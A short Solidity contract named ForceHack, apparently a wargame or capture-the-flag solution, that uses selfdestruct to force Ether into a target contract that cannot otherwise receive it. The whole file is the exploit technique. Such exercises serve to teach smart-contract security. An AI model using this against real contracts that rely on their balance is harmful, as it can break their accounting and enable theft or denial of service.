// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceHack {
    constructor() {}

    function attackContract(address payable target) external payable {
        // payable(address(target)).call{value: msg.value}("");
        selfdestruct(target);
    }

    receive() external payable {}

    fallback() external payable {}
}
